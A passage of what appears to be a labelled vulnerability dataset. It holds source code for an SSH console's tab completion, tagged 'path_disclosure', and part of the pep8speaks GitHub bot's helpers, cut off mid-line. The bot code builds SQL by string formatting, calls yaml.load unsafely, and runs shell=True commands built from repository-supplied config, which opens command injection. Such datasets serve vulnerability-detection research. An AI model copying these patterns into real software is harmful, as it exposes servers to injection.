ArgSwitchCompleter(Completer):\n    \"\"\"Completes argument switches based on the argparse grammar exposed for a command\"\"\"\n    baseclass()\n\n    def complete(self, token, parsed, parser):\n        if token.startswith(\"-\"):\n            parser = self.context.arg_parser(partial=True)\n\n            options = [option\n                       for action_group in parser._action_groups\n                       for action in action_group._group_actions\n                       for option in action.option_strings\n                       if option.startswith(token) and not self.option_consumed(action, parsed)]\n            return options\n        else:\n            return []\n\n    def option_consumed(self, action, parsed):\n        # \"count\" actions can be repeated\n        if action.nargs > 0 or isinstance(action, argparse._CountAction):\n            return False\n\n        if isinstance(action, GroupDictAction):\n            value = getattr(parsed, action.group, {}).get(action.dest, action.default)\n        else:\n            value = getattr(parsed, action.dest, action.default)\n\n        return value != action.default\n\nclass KeywordSwitchCompleter(ArgSwitchCompleter):\n    \"\"\"Completes key=value argument switches based on the argparse grammar exposed for a command.\n    TODO: probably more can be shared with ArgSwitchCompleter.\"\"\"\n\n    baseclass()\n\n    def complete(self, token, parsed, parser):\n        options = [option[1:] + '='\n                   for action_group in parser._action_groups\n                   for action in action_group._group_actions\n                   for option in action.option_strings\n                   if option.startswith('=' + token) and not self.option_consumed(action, parsed)]\n        return options\n\n\nclass KeywordValueCompleter(ArgSwitchCompleter):\n    \"\"\"Completes the `value` part of key=value constructs based on the type of the keyword.\n    Currently works only for args which declare an explicit enumeration.\"\"\"\n\n    baseclass()\n\n    def complete(self, token, parsed, parser):\n        if '=' in token:\n            keyword, value_prefix = token.split('=')\n\n            action = self.find_action(keyword, parsed, parser)\n            if action.choices:\n                return [keyword + '=' + value for value in action.choices if value.startswith(value_prefix)]\n\n        return []\n\n    def find_action(self, keyword, parsed, parser):\n        for action_group in parser._action_groups:\n            for action in action_group._group_actions:\n                if action.dest == keyword:\n                    return action\n\n\nclass ObjectTypeCompleter(Completer):\n    \"\"\"Completes object type names.\"\"\"\n\n    context(cmd.cmd_mk)\n\n    def complete(self, token):\n        return [name for name in creatable_models.keys() if name.startswith(token)]\n\n\n# TODO: move to handler\nfor command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set]:\n    provideSubscriptionAdapter(PathCompleter, adapts=[command])\n\nfor command in [cmd.cmd_ls, cmd.cmd_cd, cmd.cmd_cat, cmd.cmd_set, cmd.cmd_quit]:\n    provideSubscriptionAdapter(ArgSwitchCompleter, adapts=[command])\n\nfor command in [cmd.cmd_set]:\n    provideSubscriptionAdapter(KeywordSwitchCompleter, adapts=[command])\n\nfor command in [cmd.cmd_set]:\n    provideSubscriptionAdapter(KeywordValueCompleter, adapts=[command])\n/n/n/n/opennode/oms/endpoint/ssh/protocol.py/n/nimport os\n\nfrom columnize import columnize\nfrom twisted.internet import defer\n\nfrom opennode.oms.endpoint.ssh import cmd, completion, cmdline\nfrom opennode.oms.endpoint.ssh.terminal import InteractiveTerminal\nfrom opennode.oms.endpoint.ssh.tokenizer import CommandLineTokenizer, CommandLineSyntaxError\nfrom opennode.oms.zodb import db\n\n\nclass OmsSshProtocol(InteractiveTerminal):\n    \"\"\"The OMS virtual console over SSH.\n\n    Accepts lines of input and writes them back to its connection.  If\n    a line consisting solely of \"quit\" is received, the connection\n    is dropped.\n\n    \"\"\"\n\n    def __init__(self):\n        super(OmsSshProtocol, self).__init__()\n        self.path = ['']\n\n        @defer.inlineCallbacks\n        def _get_obj_path():\n            # Here, we simply hope that self.obj_path won't actually be\n            # used until it's initialised.  A more fool-proof solution\n            # would be to block everything in the protocol while the ZODB\n            # query is processing, but that would require a more complex\n            # workaround.  This will not be a problem during testing as\n            # DB access is blocking when testing.\n            self.obj_path = yield db.transact(lambda: [db.ref(db.get_root()['oms_root'])])()\n\n        _get_obj_path()\n\n        self.tokenizer = CommandLineTokenizer()\n\n    def lineReceived(self, line):\n        line = line.strip()\n\n        try:\n            command, cmd_args = self.parse_line(line)\n        except CommandLineSyntaxError as e:\n            self.terminal.write(\"Syntax error: %s\\n\" % (e.message))\n            self.print_prompt()\n            return\n\n        deferred = defer.maybeDeferred(command, *cmd_args)\n\n        @deferred\n        def on_success(ret):\n            self.print_prompt()\n\n        @deferred\n        def on_error(f):\n            if not f.check(cmdline.ArgumentParsingError):\n                f.raiseException()\n            self.print_prompt()\n\n        ret = defer.Deferred()\n        deferred.addBoth(ret.callback)\n        return ret\n\n    def print_prompt(self):\n        self.terminal.write(self.ps[self.pn])\n\n    def insert_buffer(self, buf):\n        \"\"\"Inserts some chars in the buffer at the current cursor position.\"\"\"\n        lead, rest = self.lineBuffer[0:self.lineBufferIndex], self.lineBuffer[self.lineBufferIndex:]\n        self.lineBuffer = lead + buf + rest\n        self.lineBufferIndex += len(buf)\n\n    def insert_text(self, text):\n        \"\"\"Inserts some text at the current cursor position and renders it.\"\"\"\n        self.terminal.write(text)\n        self.insert_buffer(list(text))\n\n    def parse_line(self, line):\n        \"\"\"Returns a command instance and parsed cmdline argument list.\n\n        TODO: Shell expansion should be handled here.\n\n        \"\"\"\n\n        cmd_name, cmd_args = line.partition(' ')[::2]\n        command_cls = cmd.get_command(cmd_name)\n\n        tokenized_cmd_args = self.tokenizer.tokenize(cmd_args.strip())\n\n        return command_cls(self), tokenized_cmd_args\n\n    @defer.inlineCallbacks\n    def handle_TAB(self):\n        \"\"\"Handles tab completion.\"\"\"\n        partial, rest, completions = yield completion.complete(self, self.lineBuffer, self.lineBufferIndex)\n\n        if len(completions) == 1:\n            space = '' if rest else ' '\n            # handle quote closing\n            if self.lineBuffer[self.lineBufferIndex - len(partial) - 1] == '\"':\n                space = '\" '\n            # Avoid space after '=' just for aestetics.\n            if completions[0].endswith('='):\n                space = ''\n\n            patch = completions[0][len(partial):] + space\n            self.insert_text(patch)\n        elif len(completions) > 1:\n            common_prefix = os.path.commonprefix(completions)\n            patch = common_prefix[len(partial):]\n            self.insert_text(patch)\n\n            # postpone showing list of possible completions until next tab\n            if not patch:\n                self.terminal.nextLine()\n                self.terminal.write(columnize(completions))\n                self.drawInputLine()\n                if len(rest):\n                    self.terminal.cursorBackward(len(rest))\n\n\n    @property\n    def hist_file_name(self):\n        return os.path.expanduser('~/.oms_history')\n\n    @property\n    def ps(self):\n        ps1 = '%s@%s:%s%s ' % ('user', 'oms', self._cwd(), '#')\n        return [ps1, '... ']\n\n    def _cwd(self):\n        return self.make_path(self.path)\n\n    @staticmethod\n    def make_path(path):\n        return '/'.join(path) or '/'\n/n/n/n/opennode/oms/tests/test_completion.py/n/nimport unittest\n\nimport mock\nfrom nose.tools import eq_\n\nfrom opennode.oms.endpoint.ssh.protocol import OmsSshProtocol\nfrom opennode.oms.endpoint.ssh import cmd\n\n\nclass CmdCompletionTestCase(unittest.TestCase):\n\n    def setUp(self):\n        self.oms_ssh = OmsSshProtocol()\n        self.terminal = mock.Mock()\n        self.oms_ssh.terminal = self.terminal\n\n        self.oms_ssh.connectionMade()\n\n        # the standard model doesn't have any command or path which\n        # is a prefix of another (len > 1), I don't want to force changes\n        # to the model just for testing completion, so we have monkey patch\n        # the commands() function and add a command 'hello'.\n        self.orig_commands = cmd.commands\n        cmd.commands = lambda: dict(hello=cmd.Cmd, **self.orig_commands())\n\n    def tearDown(self):\n        cmd.commands = self.orig_commands\n\n    def _input(self, string):\n        for s in string:\n            self.oms_ssh.characterReceived(s, False)\n\n    def _tab_after(self, string):\n        self._input(string)\n        self.terminal.reset_mock()\n\n        self.oms_ssh.handle_TAB()\n\n    def test_command_completion(self):\n        self._tab_after('s')\n        eq_(self.terminal.method_calls, [('write', ('et ',), {})])\n\n    def test_command_completion_spaces(self):\n        self._tab_after('    s')\n        eq_(self.terminal.method_calls, [('write', ('et ',), {})])\n\n    def test_complete_not_found(self):\n        self._tab_after('t')\n        eq_(len(self.terminal.method_calls), 0)\n\n    def test_complete_quotes(self):\n        self._tab_after('ls \"comp')\n        eq_(self.terminal.method_calls, [('write', ('utes\" ',), {})])\n\n    def test_complete_prefix(self):\n        self._tab_after('h')\n        eq_(self.terminal.method_calls, [('write', ('el',), {})])\n\n        # hit tab twice\n        self.terminal.reset_mock()\n        self.oms_ssh.handle_TAB()\n\n        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('help  hello\\n',), {}), ('write', (self.oms_ssh.ps[0] + 'hel',), {})])\n\n    def test_spaces_between_arg(self):\n        self._tab_after('ls comp')\n        eq_(self.terminal.method_calls, [('write', ('utes ',), {})])\n\n    def test_command_arg_spaces_before_command(self):\n        self._tab_after(' ls comp')\n        eq_(self.terminal.method_calls, [('write', ('utes ',), {})])\n\n    def test_mandatory_positional(self):\n        self._tab_after('cat ')\n        eq_(len(self.terminal.method_calls), 4)\n\n    def test_complete_switches(self):\n        self._tab_after('quit ')\n        eq_(len(self.terminal.method_calls), 0)\n\n        # hit tab twice\n        self.oms_ssh.handle_TAB()\n        eq_(len(self.terminal.method_calls), 0)\n\n        # now try with a dash\n        self._tab_after('-')\n        eq_(self.terminal.method_calls, [('write', ('',), {}), ('nextLine', (), {}), ('write', ('-h  --help\\n',), {}), ('write', (self.oms_ssh.ps[0] + 'quit -',), {})])\n        # disambiguate\n        self._tab_after('-')\n        eq_(self.terminal.method_calls, [('write', ('help ',), {})])\n\n    def test_complete_consumed_switches(self):\n        self._tab_after('ls --help')\n        eq_(self.terminal.method_calls, [('write', (' ',), {})])\n\n        self._tab_after('-')\n        assert 'help' not in self.terminal.method_calls[2][1][0]\n        assert '-h' not in self.terminal.method_calls[2][1][0]\n/n/n/n", "label": 1, "vtype": "path_disclosure"}, {"id": "e09ec28786aa04bb7a6459fec6294bbb9368671a", "code": "pep8speaks/helpers.py/n/n# -*- coding: utf-8 -*-\n\nimport base64\nimport collections\nimport datetime\nimport hmac\nimport json\nimport os\nimport re\nimport subprocess\nimport time\n\nimport psycopg2\nimport requests\nimport unidiff\nimport yaml\nfrom flask import abort\n\n\ndef update_users(repository):\n    \"\"\"Update users of the integration in the database\"\"\"\n    if os.environ.get(\"OVER_HEROKU\", False) is not False:\n        # Check if repository exists in database\n        query = r\"INSERT INTO Users (repository, created_at) VALUES ('{}', now());\" \\\n                \"\".format(repository)\n\n        try:\n            cursor.execute(query)\n            conn.commit()\n        except psycopg2.IntegrityError:  # If already exists\n            conn.rollback()\n\n\ndef follow_user(user):\n    \"\"\"Follow the user of the service\"\"\"\n    headers = {\n        \"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"],\n        \"Content-Length\": \"0\",\n    }\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    url = \"https://api.github.com/user/following/{}\"\n    url = url.format(user)\n    r = requests.put(url, headers=headers, auth=auth)\n\n\ndef update_dict(base, head):\n    \"\"\"\n    Recursively merge or update dict-like objects.\n    >>> update({'k1': 1}, {'k1': {'k2': {'k3': 3}}})\n\n    Source : http://stackoverflow.com/a/32357112/4698026\n    \"\"\"\n    for key, value in head.items():\n        if key in base:\n            if isinstance(base, collections.Mapping):\n                if isinstance(value, collections.Mapping):\n                    base[key] = update_dict(base.get(key, {}), value)\n                else:\n                    base[key] = head[key]\n            else:\n                base = {key: head[key]}\n    return base\n\n\ndef match_webhook_secret(request):\n    \"\"\"Match the webhook secret sent from GitHub\"\"\"\n    if os.environ.get(\"OVER_HEROKU\", False) is not False:\n        header_signature = request.headers.get('X-Hub-Signature')\n        if header_signature is None:\n            abort(403)\n        sha_name, signature = header_signature.split('=')\n        if sha_name != 'sha1':\n            abort(501)\n        mac = hmac.new(os.environ[\"GITHUB_PAYLOAD_SECRET\"].encode(), msg=request.data,\n                       digestmod=\"sha1\")\n        if not hmac.compare_digest(str(mac.hexdigest()), str(signature)):\n            abort(403)\n    return True\n\n\ndef check_pythonic_pr(data):\n    \"\"\"\n    Return True if the PR contains at least one Python file\n    \"\"\"\n    files = list(get_files_involved_in_pr(data).keys())\n    pythonic = False\n    for file in files:\n        if file[-3:] == '.py':\n            pythonic = True\n            break\n\n    return pythonic\n\n\ndef get_config(data):\n    \"\"\"\n    Get .pep8speaks.yml config file from the repository and return\n    the config dictionary\n    \"\"\"\n\n    # Default configuration parameters\n    config = {\n        \"message\": {\n            \"opened\": {\n                \"header\": \"\",\n                \"footer\": \"\"\n            },\n            \"updated\": {\n                \"header\": \"\",\n                \"footer\": \"\"\n            }\n        },\n        \"scanner\": {\"diff_only\": False},\n        \"pycodestyle\": {\n            \"ignore\": [],\n            \"max-line-length\": 79,\n            \"count\": False,\n            \"first\": False,\n            \"show-pep8\": False,\n            \"filename\": [],\n            \"exclude\": [],\n            \"select\": [],\n            \"show-source\": False,\n            \"statistics\": False,\n            \"hang-closing\": False,\n        },\n        \"no_blank_comment\": True,\n        \"only_mention_files_with_errors\": True,\n    }\n\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    # Configuration file\n    url = \"https://raw.githubusercontent.com/{}/{}/.pep8speaks.yml\"\n\n    url = url.format(data[\"repository\"], data[\"after_commit_hash\"])\n    r = requests.get(url, headers=headers, auth=auth)\n    if r.status_code == 200:\n        try:\n            new_config = yaml.load(r.text)\n            # overloading the default configuration with the one specified\n            config = update_dict(config, new_config)\n        except yaml.YAMLError:  # Bad YAML file\n            pass\n\n    # Create pycodestyle command line arguments\n    arguments = []\n    confs = config[\"pycodestyle\"]\n    for key, value in confs.items():\n        if value:  # Non empty\n            if isinstance(value, int):\n                if isinstance(value, bool):\n                    arguments.append(\"--{}\".format(key))\n                else:\n                    arguments.append(\"--{}={}\".format(key, value))\n            elif isinstance(value, list):\n                arguments.append(\"--{}={}\".format(key, ','.join(value)))\n    config[\"pycodestyle_cmd_config\"] = ' {arguments}'.format(arguments=' '.join(arguments))\n\n    # pycodestyle is case-sensitive\n    config[\"pycodestyle\"][\"ignore\"] = [e.upper() for e in list(config[\"pycodestyle\"][\"ignore\"])]\n\n    return config\n\n\ndef get_files_involved_in_pr(data):\n    \"\"\"\n    Return a list of file names modified/added in the PR\n    \"\"\"\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    diff_headers = headers.copy()\n    diff_headers[\"Accept\"] = \"application/vnd.github.VERSION.diff\"\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    repository = data[\"repository\"]\n    after_commit_hash = data[\"after_commit_hash\"]\n    author = data[\"author\"]\n    diff_url = \"https://api.github.com/repos/{}/pulls/{}\"\n    diff_url = diff_url.format(repository, str(data[\"pr_number\"]))\n    r = requests.get(diff_url, headers=diff_headers, auth=auth)\n    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)\n\n    files = {}\n\n    for patchset in patch:\n        file = patchset.target_file[1:]\n        files[file] = []\n        for hunk in patchset:\n            for line in hunk.target_lines():\n                if line.is_added:\n                    files[file].append(line.target_line_no)\n\n    return files\n\n\ndef get_python_files_involved_in_pr(data):\n    files = get_files_involved_in_pr(data)\n    for file in list(files.keys()):\n        if file[-3:] != \".py\":\n            del files[file]\n\n    return files\n\n\ndef run_pycodestyle(data, config):\n    \"\"\"\n    Run pycodestyle script on the files and update the data\n    dictionary\n    \"\"\"\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    repository = data[\"repository\"]\n    after_commit_hash = data[\"after_commit_hash\"]\n    author = data[\"author\"]\n\n    # Run pycodestyle\n    ## All the python files with additions\n    # A dictionary with filename paired with list of new line numbers\n    py_files = get_python_files_involved_in_pr(data)\n\n    for file in py_files:\n        filename = file[1:]\n        url = \"https://raw.githubusercontent.com/{}/{}/{}\"\n        url = url.format(repository, after_commit_hash, file)\n        r = requests.get(url, headers=headers, auth=auth)\n        with open(\"file_to_check.py\", 'w+', encoding=r.encoding) as file_to_check:\n            file_to_check.write(r.text)\n\n        # Use the command line here\n        cmd = 'pycodestyle {config[pycodestyle_cmd_config]} file_to_check.py'.format(\n            config=config)\n        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n        stdout, _ = proc.communicate()\n        data[\"extra_results\"][filename] = stdout.decode(r.encoding).splitlines()\n\n        # Put only relevant errors in the data[\"results\"] dictionary\n        data[\"results\"][filename] = []\n        for error in list(data[\"extra_results\"][filename]):\n            if re.search(\"^file_to_check.py:\\d+:\\d+:\\s[WE]\\d+\\s.*\", error):\n                data[\"results\"][filename].append(error.replace(\"file_to_check.py\", filename))\n                data[\"extra_results\"][filename].remove(error)\n\n        ## Remove errors in case of diff_only = True\n        ## which are caused in the whole file\n        for error in list(data[\"results\"][filename]):\n            if config[\"scanner\"][\"diff_only\"]:\n                if not int(error.split(\":\")[1]) in py_files[file]:\n                    data[\"results\"][filename].remove(error)\n\n        ## Store the link to the file\n        url = \"https://github.com/{}/blob/{}{}\"\n        data[filename + \"_link\"] = url.format(repository, after_commit_hash, file)\n        os.remove(\"file_to_check.py\")\n\n\ndef prepare_comment(request, data, config):\n    \"\"\"Construct the string of comment i.e. its header, body and footer\"\"\"\n    author = data[\"author\"]\n    # Write the comment body\n    ## Header\n    comment_header = \"\"\n    if request.json[\"action\"] == \"opened\":\n        if config[\"message\"][\"opened\"][\"header\"] == \"\":\n            comment_header = \"Hello @\" + author + \"! Thanks for submitting the PR.\\n\\n\"\n        else:\n            comment_header = config[\"message\"][\"opened\"][\"header\"] + \"\\n\\n\"\n    elif request.json[\"action\"] in [\"synchronize\", \"reopened\"]:\n        if config[\"message\"][\"updated\"][\"header\"] == \"\":\n            comment_header = \"Hello @\" + author + \"! Thanks for updating the PR.\\n\\n\"\n        else:\n            comment_header = config[\"message\"][\"updated\"][\"header\"] + \"\\n\\n\"\n\n    ## Body\n    ERROR = False  # Set to True when any pep8 error exists\n    comment_body = []\n    for file, issues in data[\"results\"].items():\n        if len(issues) == 0:\n            if not config[\"only_mention_files_with_errors\"]:\n                comment_body.append(\n                    \" - There are no PEP8 issues in the\"\n                    \" file [`{0}`]({1}) !\".format(file, data[file + \"_link\"]))\n        else:\n            ERROR = True\n            comment_body.append(\n                \" - In the file [`{0}`]({1}), following \"\n                \"are the PEP8 issues :\\n\".format(file, data[file + \"_link\"]))\n            for issue in issues:\n                ## Replace filename with L\n                error_string = issue.replace(file + \":\", \"Line \")\n\n                ## Link error codes to search query\n                error_string_list = error_string.split(\" \")\n                code = error_string_list[2]\n                code_url = \"https://duckduckgo.com/?q=pep8%20{0}\".format(code)\n                error_string_list[2] = \"[{0}]({1})\".format(code, code_url)\n\n                ## Link line numbers in the file\n                line, col = error_string_list[1][:-1].split(\":\")\n                line_url = data[file + \"_link\"] + \"#L\" + line\n                error_string_list[1] = \"[{0}:{1}]({2}):\".format(line, col, line_url)\n                error_string = \" \".join(error_string_list)\n                error_string = error_string.replace(\"Line [\", \"[Line \")\n                comment_body.append(\"\\n> {0}\".format(error_string))\n\n        comment_body.append(\"\\n\\n\")\n        if len(data[\"extra_results\"][file]) > 0:\n            comment_body.append(\" - Complete extra results for this file :\\n\\n\")\n            comment_body.append(\"> \" + \"\".join(data[\"extra_results\"][file]))\n            comment_body.append(\"---\\n\\n\")\n\n    if config[\"only_mention_files_with_errors\"] and not ERROR:\n        comment_body.append(\"Cheers ! There are no PEP8 issues in this Pull Request. :beers: \")\n\n\n    comment_body = ''.join(comment_body)\n\n\n    ## Footer\n    comment_footer = []\n    if request.json[\"action\"] == \"opened\":\n        comment_footer.append(config[\"message\"][\"opened\"][\"footer\"])\n    elif request.json[\"action\"] in [\"synchronize\", \"reopened\"]:\n        comment_footer.append(config[\"message\"][\"updated\"][\"footer\"])\n\n    comment_footer = ''.join(comment_footer)\n\n    return comment_header, comment_body, comment_footer, ERROR\n\n\ndef comment_permission_check(data, comment):\n    \"\"\"Check for quite and resume status or duplicate comments\"\"\"\n    PERMITTED_TO_COMMENT = True\n    repository = data[\"repository\"]\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    # Check for duplicate comment\n    url = \"https://api.github.com/repos/{}/issues/{}/comments\"\n    url = url.format(repository, str(data[\"pr_number\"]))\n    comments = requests.get(url, headers=headers, auth=auth).json()\n\n    # Get the last comment by the bot\n    last_comment = \"\"\n    for old_comment in reversed(comments):\n        if old_comment[\"user\"][\"id\"] == 24736507:  # ID of @pep8speaks\n            last_comment = old_comment[\"body\"]\n            break\n\n    \"\"\"\n    # Disabling this because only a single comment is made per PR\n    text1 = ''.join(BeautifulSoup(markdown(comment)).findAll(text=True))\n    text2 = ''.join(BeautifulSoup(markdown(last_comment)).findAll(text=True))\n    if text1 == text2.replace(\"submitting\", \"updating\"):\n        PERMITTED_TO_COMMENT = False\n    \"\"\"\n\n    # Check if the bot is asked to keep quiet\n    for old_comment in reversed(comments):\n        if '@pep8speaks' in old_comment['body']:\n            if 'resume' in old_comment['body'].lower():\n                break\n            elif 'quiet' in old_comment['body'].lower():\n                PERMITTED_TO_COMMENT = False\n\n\n    return PERMITTED_TO_COMMENT\n\n\ndef create_or_update_comment(data, comment):\n    comment_mode = None\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n\n    query = \"https://api.github.com/repos/{}/issues/{}/comments\"\n    query = query.format(data[\"repository\"], str(data[\"pr_number\"]))\n    comments = requests.get(query, headers=headers, auth=auth).json()\n\n    # Get the last comment id by the bot\n    last_comment_id = None\n    for old_comment in comments:\n        if old_comment[\"user\"][\"id\"] == 24736507:  # ID of @pep8speaks\n            last_comment_id = old_comment[\"id\"]\n            break\n\n    if last_comment_id is None:  # Create a new comment\n        response = requests.post(query, json={\"body\": comment}, headers=headers, auth=auth)\n        data[\"comment_response\"] = response.json()\n    else:  # Update the last comment\n        utc_time = datetime.datetime.utcnow()\n        time_now = utc_time.strftime(\"%B %d, %Y at %H:%M Hours UTC\")\n        comment += \"\\n\\n##### Comment last updated on {}\"\n        comment = comment.format(time_now)\n\n        query = \"https://api.github.com/repos/{}/issues/comments/{}\"\n        query = query.format(data[\"repository\"], str(last_comment_id))\n        response = requests.patch(query, json={\"body\": comment}, headers=headers, auth=auth)\n\n\ndef autopep8(data, config):\n    # Run pycodestyle\n\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(data[\"diff_url\"], headers=headers, auth=auth)\n    ## All the python files with additions\n    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)\n\n    # A dictionary with filename paired with list of new line numbers\n    py_files = {}\n\n    for patchset in patch:\n        if patchset.target_file[-3:] == '.py':\n            py_file = patchset.target_file[1:]\n            py_files[py_file] = []\n            for hunk in patchset:\n                for line in hunk.target_lines():\n                    if line.is_added:\n                        py_files[py_file].append(line.target_line_no)\n\n    # Ignore errors and warnings specified in the config file\n    to_ignore = \",\".join(config[\"pycodestyle\"][\"ignore\"])\n    arg_to_ignore = \"\"\n    if len(to_ignore) > 0:\n        arg_to_ignore = \"--ignore \" + to_ignore\n\n    for file in py_files:\n        filename = file[1:]\n        url = \"https://raw.githubusercontent.com/{}/{}/{}\"\n        url = url.format(data[\"repository\"], data[\"sha\"], file)\n        r = requests.get(url, headers=headers, auth=auth)\n        with open(\"file_to_fix.py\", 'w+', encoding=r.encoding) as file_to_fix:\n            file_to_fix.write(r.text)\n\n        cmd = 'autopep8 file_to_fix.py --diff {arg_to_ignore}'.format(\n            arg_to_ignore=arg_to_ignore)\n        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE)\n        stdout, _ = proc.communicate()\n        data[\"diff\"][filename] = stdout.decode(r.encoding)\n\n        # Fix the errors\n        data[\"diff\"][filename] = data[\"diff\"][filename].replace(\"file_to_check.py\", filename)\n        data[\"diff\"][filename] = data[\"diff\"][filename].replace(\"\\\\\", \"\\\\\\\\\")\n\n        ## Store the link to the file\n        url = \"https://github.com/{}/blob/{}{}\"\n        data[filename + \"_link\"] = url.format(data[\"repository\"], data[\"sha\"], file)\n        os.remove(\"file_to_fix.py\")\n\n\ndef create_gist(data, config):\n    \"\"\"Create gists for diff files\"\"\"\n    REQUEST_JSON = {}\n    REQUEST_JSON[\"public\"] = True\n    REQUEST_JSON[\"files\"] = {}\n    REQUEST_JSON[\"description\"] = \"In response to @{0}'s comment : {1}\".format(\n        data[\"reviewer\"], data[\"review_url\"])\n\n    for file, diffs in data[\"diff\"].items():\n        if len(diffs) != 0:\n            REQUEST_JSON[\"files\"][file.split(\"/\")[-1] + \".diff\"] = {\n                \"content\": diffs\n            }\n\n    # Call github api to create the gist\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    url = \"https://api.github.com/gists\"\n    res = requests.post(url, json=REQUEST_JSON, headers=headers, auth=auth).json()\n    data[\"gist_response\"] = res\n    data[\"gist_url\"] = res[\"html_url\"]\n\n\ndef delete_if_forked(data):\n    FORKED = False\n    url = \"https://api.github.com/user/repos\"\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(url, headers=headers, auth=auth)\n    for repo in r.json():\n        if repo[\"description\"]:\n            if data[\"target_repo_fullname\"] in repo[\"description\"]:\n                FORKED = True\n                r = requests.delete(\"https://api.github.com/repos/\"\n                                \"{}\".format(repo[\"full_name\"]),\n                                headers=headers, auth=auth)\n    return FORKED\n\n\ndef fork_for_pr(data):\n    FORKED = False\n    url = \"https://api.github.com/repos/{}/forks\"\n    url = url.format(data[\"target_repo_fullname\"])\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.post(url, headers=headers, auth=auth)\n    if r.status_code == 202:\n        data[\"fork_fullname\"] = r.json()[\"full_name\"]\n        FORKED = True\n    else:\n        data[\"error\"] = \"Unable to fork\"\n    return FORKED\n\n\ndef update_fork_desc(data):\n    # Check if forked (takes time)\n    url = \"https://api.github.com/repos/{}\".format(data[\"fork_fullname\"])\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(url, headers=headers, auth=auth)\n    ATTEMPT = 0\n    while(r.status_code != 200):\n        time.sleep(5)\n        r = requests.get(url, headers=headers, auth=auth)\n        ATTEMPT += 1\n        if ATTEMPT > 10:\n            data[\"error\"] = \"Forking is taking more than usual time\"\n            break\n\n    full_name = data[\"target_repo_fullname\"]\n    author, name = full_name.split(\"/\")\n    request_json = {\n        \"name\": name,\n        \"description\": \"Forked from @{}'s {}\".format(author, full_name)\n    }\n    r = requests.patch(url, data=json.dumps(request_json), headers=headers, auth=auth)\n    if r.status_code != 200:\n        data[\"error\"] = \"Could not update description of the fork\"\n\n\ndef create_new_branch(data):\n    url = \"https://api.github.com/repos/{}/git/refs/heads\"\n    url = url.format(data[\"fork_fullname\"])\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    sha = None\n    r = requests.get(url, headers=headers, auth=auth)\n    for ref in r.json():\n        if ref[\"ref\"].split(\"/\")[-1] == data[\"target_repo_branch\"]:\n            sha = ref[\"object\"][\"sha\"]\n\n    url = \"https://api.github.com/repos/{}/git/refs\"\n    url = url.format(data[\"fork_fullname\"])\n    data[\"new_branch\"] = \"{}-pep8-patch\".format(data[\"target_repo_branch\"])\n    request_json = {\n        \"ref\": \"refs/heads/{}\".format(data[\"new_branch\"]),\n        \"sha\": sha,\n    }\n    r = requests.post(url, json=request_json, headers=headers, auth=auth)\n\n    if r.status_code != 200:\n        data[\"error\"] = \"Could not create new branch in the fork\"\n\n\ndef autopep8ify(data, config):\n    # Run pycodestyle\n    headers = {\"Authorization\": \"token \" + os.environ[\"GITHUB_TOKEN\"]}\n    auth = (os.environ[\"BOT_USERNAME\"], os.environ[\"BOT_PASSWORD\"])\n    r = requests.get(data[\"diff_url\"], headers=headers, auth=auth)\n\n    ## All the python files with additions\n    patch = unidiff.PatchSet(r.content.splitlines(), encoding=r.encoding)\n\n    # A dictionary with filename paired with list of new line numbers\n    py_files = {}\n\n    for patchset in patch:\n        if patchset.target_file[-3:] == '.py':\n            py_file = patchset.target_file[1:]\n            py_files[py_file] = []\n            for hunk in patchset:\n                for line in hunk.target_lines():\n                    if line.is_added:\n                        py_files[py_file].append(line.target_line_no)\n\n    # Ignore errors and warnings specified in the config file\n    to_ignore = \",\".join(config[\"pycodestyle\"][\"ignore\"])\n    arg_to_ignore = \"\"\n    if len(to_ignore) > 0:\n        arg_to_ignore = \"--ignore \" + to_ignore\n\n    for file in py_files:\n        filename = file[1:]\n        url = \"https://raw.githubusercontent.com/{}/{}/{}\"\n        url = url.format(data[\"repository\"], data[\"sha\"], file)\n        r = requests.get(url, headers=headers, auth=auth)\n        with open(\"file_to_fix.py\", 'w+', encoding=r.encoding) as file_to_fix:\n            file_to_fix.write(r.text)\n\n        cmd = 'autopep8 file_to_fix.py {arg_to_ignore}'.format(\n            arg_to_ignore=arg_to_ignore)\n        proc = subprocess.Popen(cmd, 